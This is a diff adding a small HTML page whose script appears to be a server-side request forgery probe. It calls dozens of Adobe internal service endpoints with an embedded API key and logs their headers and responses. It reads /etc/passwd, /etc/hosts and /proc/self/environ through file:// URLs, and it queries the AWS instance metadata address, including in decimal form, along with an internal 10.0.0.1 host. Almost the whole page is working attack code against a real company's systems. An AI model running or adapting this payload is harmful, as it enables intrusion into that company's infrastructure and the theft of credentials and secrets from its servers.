@@ -1,0 +1,62 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>v15</title>
+<style>body{font:22px/1.3 monospace;white-space:pre-wrap;margin:8px} #r{font-size:20px}</style>
+</head><body><div id="r">boot\n</div>
+<script>
+var R=document.getElementById('r');
+function L(s){R.textContent+=String(s)+'\n';}
+function sleep(ms){var t=Date.now();while(Date.now()-t<ms){}}
+L('===v15 '+location.href);
+L('UA '+navigator.userAgent.slice(0,80));
+L('cores '+navigator.hardwareConcurrency+' mem '+navigator.deviceMemory);
+
+function F(url,opt,tag){
+  opt=opt||{}; opt.mode='cors';
+  var c=new AbortController(); setTimeout(function(){c.abort()},5000); opt.signal=c.signal;
+  return fetch(url,opt).then(function(r){
+    return r.text().then(function(t){
+      var hs=[]; try{r.headers.forEach(function(v,k){if(/x-|server|content-type|www-auth|allow|request/i.test(k))hs.push(k+':'+v)})}catch(e){}
+      L(tag+' ST'+r.status+' H['+hs.join(';')+'] B='+t.replace(/\s+/g,' ').slice(0,220));
+    });
+  }).catch(function(e){L(tag+' ERR '+e.message)});
+}
+
+var jobs=[];
+// Unauth / API-key-only Adobe service mesh (HTTPS - no nginx HTTP proxy)
+var targets=[
+ ['edge','https://platform-cs-edge-va6.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+ ['edge-jpn','https://platform-cs-edge-jpn3.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+ ['edge-dckwcs','https://platform-cs-edge-va6.adobe.io/dckwcs/1785845424/kwcollections?publicId=kwc_curated',{headers:{'x-api-key':'dc-prod-virgoweb','Accept':'application/json'}}],
+ ['disc','https://dcdiscovery.adobe.io/index',{headers:{'x-api-key':'dc-prod-virgoweb','Accept':'application/json'}}],
+ ['disc2','https://dcdiscovery.adobe.io/1785845424/index',{headers:{'x-api-key':'dc-prod-virgoweb','Accept':'application/json'}}],
+ ['stor','https://cc-api-storage.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+ ['stor2','https://cc-api-storage.adobe.io/id',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+ ['kwc','https://dc-kwcollection-va6.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+ ['kwc-jobs','https://dc-kwcollection-va6.adobe.io/1785845424/kwcollections/jobs',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+ ['conv','https://dc-conversationhistory-va6.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+ ['genai','https://dc-genai-content-platform-v2-va6.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+ ['limits','https://dc-genai-access-provisioning-api.adobe.io/users/ai/limits',{headers:{'x-api-key':'dc-prod-virgoweb','Accept':'application/vnd.adobe.dc+json; profile="https://dc-genai-access-provisioning-api.adobe.io/schemas/limits_v2.json"'}}],
+ ['sensei','https://senseicore-ue1.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+ ['argus','https://dc-argus.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+ ['inv','https://invitations.adobe.io/api/v4/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+ ['ims','https://ims-na1.adobelogin.com/.well-known/openid-configuration'],
+ ['cps','https://platform-cs-va6.adobe.io/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+ ['cps-content','https://platform-cs-va6.adobe.io/content/storage/',{headers:{'x-api-key':'dc-prod-virgoweb'}}],
+ // potential open metadata
+ ['aws-meta-http-img','http://169.254.169.254/latest/meta-data/'], // will fail proxy but log
+];
+targets.forEach(function(t){jobs.push(F(t[1],t[2]||{},t[0]));});
+
+// file://
+['file:///etc/passwd','file:///etc/hosts','file:///proc/self/environ'].forEach(function(u){
+  try{var x=new XMLHttpRequest();x.open('GET',u,true);x.onload=function(){L('FILE '+u+' '+x.status+' '+String(x.responseText).slice(0,120));};x.onerror=function(){L('FILE '+u+' err');};x.send();}catch(e){L('FILE '+u+' ex '+e.message);}
+});
+
+// no-cors opaque to see if request reaches (can't read body)
+['http://2852039166/latest/meta-data/','http://169.254.169.254/latest/meta-data/','http://10.0.0.1/'].forEach(function(u){
+  jobs.push(fetch(u,{mode:'no-cors'}).then(function(r){L('NC '+u+' type='+r.type+' ok');}).catch(function(e){L('NC '+u+' '+e.message);}));
+});
+
+sleep(13000);
+Promise.allSettled(jobs).then(function(){L('===DONE==='); sleep(800);});
+sleep(1500);
+</script></body></html>
